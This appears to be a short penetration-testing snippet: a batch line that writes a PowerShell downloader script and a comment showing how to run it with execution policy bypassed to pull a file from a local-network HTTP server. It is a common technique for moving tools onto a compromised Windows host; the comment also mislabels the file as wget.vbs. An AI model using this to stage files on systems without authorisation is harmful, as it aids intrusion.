REM Usage after creating wget.vbs: 
REM     powershell -ExecutionPolicty Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 
REM	  	  http://192.168.12.34:8000/file.txt file.txt

echo (New-Object System.Net.WebClient).DownloadFile($args[0], $args[1])> wget.ps1
